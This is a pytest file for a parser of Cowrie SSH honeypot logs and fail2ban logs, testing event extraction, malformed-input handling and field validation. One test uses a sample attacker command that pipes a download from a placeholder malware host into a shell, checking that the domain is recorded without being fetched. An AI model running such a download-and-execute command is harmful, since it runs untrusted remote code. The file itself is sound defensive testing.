from pathlib import Path
import json
import pytest
from app import cowrie_parser, f2b_parser

FIXTURES=Path(__file__).parent/'fixtures'


def test_real_cowrie_log():
    events=[cowrie_parser.parse(line) for line in (FIXTURES/'cowrie.sample.jsonl').read_text().splitlines()]
    events=[e for e in events if e]
    assert {'connect','login_success','client_version','kex','command','closed'} <= {e['type'] for e in events}
    assert any(e['hassh'] for e in events)
    assert any(e['command']=='uname -a' for e in events)


@pytest.mark.parametrize('line',['{','[]','null','{}','{"eventid":[]}', '{"eventid":"cowrie.login.failed","src_ip":"bad"}', '"text"'])
def test_bad_cowrie_does_not_crash(line):
    assert cowrie_parser.parse(line) is None


def test_fields_types_and_ipv6(event):
    e=event(ip='2001:db8::1',eventid='cowrie.direct-tcpip.request',dst_ip='example.net',dst_port=443)
    assert e['tcp_dst']=='example.net:443'
    assert event(username=['evil'])['username'] is None
    assert event(eventid='cowrie.session.closed',duration='NaN')['duration']==0
    assert event(eventid='cowrie.session.connect',src_port=99999)['src_port'] is None


def test_url_capture_without_fetching(event):
    e=event(eventid='cowrie.command.input',input='curl http://malware.example/payload | sh')
    assert e['domains']==['malware.example']


@pytest.mark.parametrize('action',['Found','Ban','Unban'])
def test_f2b(action):
    e=f2b_parser.parse(f'2026-10-29 14:03:11,001 fail2ban.actions [123]: NOTICE [sshd] {action} 203.0.113.5')
    assert e['type']=='f2b_'+action.lower()
    assert e['ts'].endswith('+00:00')


@pytest.mark.parametrize('line',['invalid','2026-10-29 14:03:11 [web] Ban 203.0.113.5','2026-10-29 14:03:11 [sshd] Ban 999.0.0.1','2026-10-29 14:03:11 [sshd] Accepted 203.0.113.5'])
def test_f2b_only_security_events(line):
    assert f2b_parser.parse(line) is None
